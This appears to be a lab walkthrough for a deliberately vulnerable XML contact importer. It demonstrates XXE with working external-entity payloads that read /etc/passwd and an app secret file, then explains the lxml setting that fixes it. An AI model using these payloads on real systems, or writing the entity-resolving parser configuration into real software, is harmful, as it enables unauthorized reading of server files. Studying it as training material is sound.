# Walkthrough — xxe-basic

You are the pentester, working alone. The app imports a contact from an XML document and shows you the imported name. XML looks harmless — until you remember that XML has a DTD, and a DTD lets you declare an *entity* that points at a file on the server. If the parser resolves that entity, the file's contents become the contact's "name" and come straight back on your screen. You will read `/etc/passwd`, then the app's own secret.

## 1. Context

The app exposes a "Contact Importer". On `/` you get a form with a `<textarea>` pre-filled with a benign contact card. Submitting it sends `POST /import` with a form field `xml=<the document>`; the server parses the XML with `lxml`, pulls out the `<name>` element, and renders `Imported contact: <name>`.

The parser is built to resolve **external entities**. That single setting is the whole bug — the import logic is otherwise ordinary. This is **A05 — XML External Entity (XXE) injection** (XXE is folded into A05 Security Misconfiguration in the 2021 Top 10; it was its own category, A4, in 2017).

There is no database and no second service — just the `vulnerable` app on `127.0.0.1:8018` and the `fixed` app on `127.0.0.1:8118`. Primary track is Burp; a browser track follows at the end.

## 2. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py). The `/import` view parses like this:

```python
xml = request.form.get("xml", "")
# VULNERABLE: parse untrusted XML with a parser that RESOLVES EXTERNAL ENTITIES
parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=True)  # dangerous
doc = etree.fromstring(xml.encode("utf-8"), parser)
name = doc.findtext("name") or ""
```

`resolve_entities=True` tells `lxml` to expand entities, and `load_dtd=True` lets it process the `DOCTYPE`. Together they mean: if your document declares an external `SYSTEM` entity, the parser will fetch what it points at and substitute the contents in place. Point it at a `file://` URL and the parser reads that file. Audit question: *does the parser resolve an entity that I declare inside the document, including one pointing at a server file?* — yes. `no_network=True` keeps it to local files (not the network), which is why this is arbitrary file disclosure and not SSRF.

## 3. Exploitation via Burp Suite (primary track)

Configure Burp Proxy and point your browser at it. Visit <http://127.0.0.1:8018/>, submit the pre-filled form once to capture the traffic, then right-click the `POST /import` request in **Proxy → HTTP history** and choose **Send to Repeater**.

The captured baseline request looks like this — an HTML form post, so the body is a single URL-encoded `xml=` field:

```
POST /import HTTP/1.1
Host: 127.0.0.1:8018
Content-Type: application/x-www-form-urlencoded
Content-Length: 121

xml=%3Ccontact%3E%0A++%3Cname%3EAda+Lovelace%3C%2Fname%3E%0A++%3Cemail%3Eada%40example.com%3C%2Femail%3E%0A%3C%2Fcontact%3E
```

### A note on encoding the body

The body is `application/x-www-form-urlencoded`, and that format has one trap that bites everyone once: **`&` separates fields.** Your XXE payload uses `&x;` to reference the entity — if you paste it raw, the `&` starts a new form field and the server never sees your entity reference. So the whole `xml=` **value** must be URL-encoded: `<` → `%3C`, `>` → `%3E`, `"` → `%22`, and critically `&` → `%26`.

The easy way in Repeater: paste the decoded XML after `xml=`, select just that value, and press **Ctrl+U**. Burp URL-encodes the selection — spaces, angle brackets, quotes, and the all-important `&`. Each step below shows the **payload decoded** (for reading); encode it before sending.

### Step 1 — Baseline: the feature works

Payload (the pre-filled card):

```xml
<contact>
  <name>Ada Lovelace</name>
  <email>ada@example.com</email>
</contact>
```

Response:

```
Imported contact:
Ada Lovelace
```

The importer reads `<name>` and echoes it. Normal feature, working as intended.

### Step 2 — Read `/etc/passwd`

Add a `DOCTYPE` that declares an external entity, and use it inside `<name>`:

```xml
<!DOCTYPE contact [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<contact><name>&x;</name></contact>
```

Encode the value (remember `&` → `%26`) and send. Response:

```
Imported contact:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
...
```

The entity `&x;` expanded to the contents of `/etc/passwd`, and the app echoed it as the contact's "name". That is the proof: your document made the server read a file and hand it back. `/etc/passwd` is the classic first read — world-readable, always present, and not itself a secret (password hashes live in `/etc/shadow`, which the app process can't read).

### Step 3 — Read the app's own secret (climax)

Same payload, point the entity at the app's own file:

```xml
<!DOCTYPE contact [<!ENTITY x SYSTEM "file:///app/secret.txt">]>
<contact><name>&x;</name></contact>
```

Response:

```
Imported contact:
APP_API_KEY=FLAG-xxe-9f1c2a-EXAMPLE-not-a-real-secret
```

That is a file the application planted for itself and never meant to expose. Any file the app process can read — configs, source, keys — is now readable through the importer. (The value here is an obviously fake lab placeholder, not a real secret.)

## 4. What the vuln is NOT

The exploit is a document, not a magic string, so it is easy to draw the wrong lesson. Isolate the real cause:

- **It is NOT "processing XML is dangerous".** Parsing XML is fine. Resolving *external entities* is the bug. **Proof:** send the benign card from Step 1 (no `DOCTYPE`) to the vulnerable app **and** to the fixed app — both return exactly `Imported contact: Ada Lovelace`. The import logic is identical on both. Only adding the `DOCTYPE` + entity separates them.
- **It is NOT an app-logic bug.** Nothing in the `/import` route is wrong — both versions parse and echo the same way. The only difference between `vulnerable/` and `fixed/` is one parser setting (resolve external entities vs not). See [`DIFF.md`](./DIFF.md).
- **It is NOT SSRF.** With `no_network=True` (lxml's default), the entity reads a local file (`file://`) and does not reach the network. Point an entity at `http://…` and nothing is fetched — the `name` comes back empty. This atom is file disclosure, not a server-side request.
- **It is NOT XSS.** The file contents come back **escaped**: a payload whose name is `<script>alert(1)</script>` renders as `&lt;script&gt;alert(1)&lt;/script&gt;` in the page source, not a live tag. The bug is the parser reading the file, not how the result is displayed.
- **It is NOT "the standard library is broken".** Python's `xml.etree.ElementTree` would not expand this external entity at all — the vulnerability lives specifically in the `lxml` parser being told to resolve entities. That is why this atom uses `lxml`; see the DIFF.

The one thing it **is**: the parser resolves an entity *you* declare, pointed at a server file, and returns the contents. The only fix is to stop resolving external entities.

## 5. Impact

**Arbitrary file disclosure.** The attacker reads any file the app process can read — `/etc/passwd`, the app's own `secret.txt`, configuration, source code, keys. That is the finding here: disclosure, not code execution. XXE is a broad class with other faces beyond in-band file reads, but this atom is a straight, in-band file read — no overclaim, and no remote code execution on the app server by itself.

## 6. Why the fix works

See [`DIFF.md`](./DIFF.md) for the change. The fixed app builds its parser with the dangerous features **off**:

```python
parser = etree.XMLParser(resolve_entities=False, load_dtd=False, no_network=True)  # hardened
```

Replay Steps 2 and 3 against <http://127.0.0.1:8118/import>. The `SYSTEM` entity is never resolved, so `<name>` has no expanded text and the response comes back with an **empty** name:

```
Imported contact:

```

No file contents, for either payload. The benign card from Step 1 still imports as `Ada Lovelace` — the feature is intact; only the file read is gone. The whole fix is those two flags flipped off. (`defusedxml` is the historical name people reach for, but its `lxml` support is deprecated — hardening the parser directly is the current advice. See the DIFF.)

## 7. Exploitation via browser (secondary track, optional)

For a first, low-friction pass without Burp: open <http://127.0.0.1:8018/>, clear the textarea, and paste the malicious document directly:

```xml
<!DOCTYPE contact [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<contact><name>&x;</name></contact>
```

Click **Import** and the `/etc/passwd` contents render on the result page. The browser sends the form for you (no manual encoding needed), which makes this the easiest way to *feel* the bug the first time. Then repeat against <http://127.0.0.1:8118/> and watch the name come back empty. Switch to Burp for everything after the first read-through — controlling the raw payload is the part that matters in an engagement.
